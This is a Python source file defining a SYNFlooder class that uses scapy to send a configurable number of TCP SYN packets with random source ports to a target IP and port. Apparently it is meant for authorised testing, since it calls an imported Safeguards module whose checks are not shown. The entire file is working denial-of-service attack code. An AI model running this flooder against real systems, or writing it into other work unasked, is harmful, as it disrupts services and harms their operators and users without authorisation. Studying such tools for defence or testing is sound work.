# -*- coding: utf-8 -*-

from scapy.all import IP, TCP, send
from config import Safeguards
import random
import time
from typing import Optional

class SYNFlooder:
    def __init__(self, target_ip: str, target_port: int = 80):
        Safeguards.validate_target(target_ip)
        self.target = target_ip
        self.port = target_port
        self.sent_packets = 0

    def send_flood(self, count: int = 1000, interval: float = 0.01):
        Safeguards.enforce_limits(count)
        
        print(f"[+] Targeting {self.target}:{self.port} with {count} SYN packets")
        
        try:
            for _ in range(count):
                # Explicitly set verbose=0 in send()
                send(
                    IP(dst=self.target)/TCP(
                        dport=self.port,
                        sport=random.randint(1024, 65535)
                    ),
                    verbose=0
                )
                self.sent_packets += 1
                time.sleep(interval)

            print(f"[+] Successfully sent {self.sent_packets} packets")
            
        except Exception as e:
            print(f"[!] Packet sending failed: {str(e)}")
            raise